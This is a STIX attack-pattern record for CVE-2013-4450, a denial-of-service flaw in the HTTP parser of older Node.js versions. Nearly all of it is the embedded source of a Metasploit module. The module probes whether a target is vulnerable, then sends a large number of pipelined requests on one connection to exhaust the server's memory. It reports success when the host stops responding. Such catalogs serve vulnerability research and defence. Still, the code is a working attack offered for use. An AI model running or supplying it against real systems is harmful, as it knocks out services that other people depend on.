{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2e15bcaf-b8b7-4ad9-801b-c9abd2d384ea",
    "created": "2024-08-14T16:25:56.239488Z",
    "modified": "2024-08-14T16:25:56.239493Z",
    "name": "Node.js HTTP Pipelining Denial of Service",
    "description": " This module exploits a Denial of Service (DoS) condition in the HTTP parser of Node.js versions released before 0.10.21 and 0.8.26. The attack sends many pipelined HTTP requests on a single connection, which causes unbounded memory allocation when the client does not read the responses. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/http/nodejs_pipelining.rb",
            "external_id": "nodejs_pipelining.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-4450"
        },
        {
            "source_name": "reference",
            "url": "https://nodejs.org/ja/blog/vulnerability/http-server-pipeline-flood-dos/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Node.js HTTP Pipelining Denial of Service',\n      'Description'    => %q{\n        This module exploits a Denial of Service (DoS) condition in the HTTP parser of Node.js versions\n        released before 0.10.21 and 0.8.26. The attack sends many pipelined\n        HTTP requests on a single connection, which causes unbounded memory\n        allocation when the client does not read the responses.\n      },\n      'Author'         =>\n        [\n          'Marek Majkowski', # Vulnerability discovery\n          'titanous',        # Metasploit module\n          'joev'             # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2013-4450' ],\n          [ 'OSVDB', '98724' ],\n          [ 'BID' , '63229' ],\n          [ 'URL', 'https://nodejs.org/ja/blog/vulnerability/http-server-pipeline-flood-dos/' ]\n        ],\n      'DisclosureDate' => '2013-10-18'))\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptInt.new('RLIMIT', [true,  \"Number of requests to send\", 100000])\n      ],\n    self.class)\n  end\n\n  def check\n    # http://blog.nodejs.org/2013/08/21/node-v0-10-17-stable/\n    # check if we are < 0.10.17 by seeing if a malformed HTTP request is accepted\n    status = Exploit::CheckCode::Safe\n    connect\n    sock.put(http_request(\"GEM\"))\n    begin\n      response = sock.get_once\n      status = Exploit::CheckCode::Appears if response =~ /HTTP/\n    rescue EOFError\n      # checking against >= 0.10.17 raises EOFError because there is no\n      # response to GEM requests\n      vprint_error(\"Failed to determine the vulnerable state due to an EOFError (no response)\")\n      return Msf::Exploit::CheckCode::Unknown\n    ensure\n      disconnect\n    end\n    status\n  end\n\n  def host\n      host = datastore['RHOST']\n      host += \":\" + datastore['RPORT'].to_s if datastore['RPORT'] != 80\n      host\n  end\n\n  def http_request(method='GET')\n    \"#{method} / HTTP/1.1\\r\\nHost: #{host}\\r\\n\\r\\n\"\n  end\n\n  def run\n    payload = http_request\n    begin\n      print_status(\"Stressing the target memory...\")\n      connect\n      datastore['RLIMIT'].times { sock.put(payload) }\n      print_status(\"Attack finished. If you read it, it wasn't enough to trigger an Out Of Memory condition.\")\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      print_status(\"Unable to connect to #{host}.\")\n    rescue ::Errno::ECONNRESET, ::Errno::EPIPE, ::Timeout::Error\n      print_good(\"DoS successful. #{host} not responding. Out Of Memory condition probably reached\")\n    ensure\n      disconnect\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-10-18"
}